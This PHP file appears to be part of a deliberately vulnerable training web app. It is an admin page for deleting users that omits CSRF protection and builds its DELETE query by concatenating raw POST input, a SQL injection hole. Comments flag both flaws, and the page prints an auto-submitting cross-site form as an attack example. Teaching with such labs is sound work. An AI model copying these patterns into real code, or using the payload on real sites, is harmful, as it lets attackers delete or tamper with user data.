<?php
require_once '../config.inc';

// ¡VULNERABILIDAD: Sin verificación de token CSRF!
if (!isset($_SESSION['is_admin']) || !$_SESSION['is_admin']) {
    die("Access denied!");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_id = $_POST['user_id'];
    
    // ¡VULNERABILIDAD: SQL Injection + Sin confirmación!
    $query = "DELETE FROM users WHERE id = " . $user_id;
    $mysqli->query($query);
    
    echo "User deleted successfully!";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Delete User - Admin Panel</title>
</head>
<body>
    <h1>Delete User</h1>
    <form method="POST">
        <input type="number" name="user_id" placeholder="User ID" required>
        <input type="submit" value="Delete User">
    </form>
    
    <div style="background: #ffcccc; padding: 15px; margin-top: 20px;">
        <h3>⚠️ CSRF Vulnerability Demo</h3>
        <p>This form is vulnerable to CSRF attacks.</p>
        <p>Attack example:</p>
        <pre>
&lt;form action="http://vulnmart.com/admin/delete_user.php" method="POST"&gt;
  &lt;input type="hidden" name="user_id" value="2" /&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
        </pre>
    </div>
</body>
</html>